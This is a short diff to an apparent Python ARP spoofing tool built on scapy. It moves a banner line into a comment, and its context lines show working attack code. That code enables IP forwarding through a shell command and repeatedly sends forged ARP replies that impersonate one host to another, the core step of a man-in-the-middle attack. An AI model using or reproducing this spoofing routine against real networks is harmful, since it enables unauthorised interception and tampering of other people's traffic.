@@ -47,7 +47,6 @@ def spoof(target_ip, spoof_ip, count, sleeptime):
     print("Date:23/06/2021\n")
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     print("[+]ip forwarding enabled")
-    print("[+]( machine1 )-<->-( YOU )-<->-( machine2 )")
     h = int(sleeptime)
     v = int(count)
     try:
@@ -56,6 +55,7 @@ def spoof(target_ip, spoof_ip, count, sleeptime):
             # print("[+]target mac: {}".format(target_mac))
             create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
             scapy.send(create_packet, verbose=False)
+            # ( machine1 )-<->-( YOU )-<->-( machine2 )
             # destination = scapy.Ether(dst=target_mac)
             # final_packet = destination/create_packet
             # send_packet = scapy.srp(final_packet, timeout=1, verbose=False)
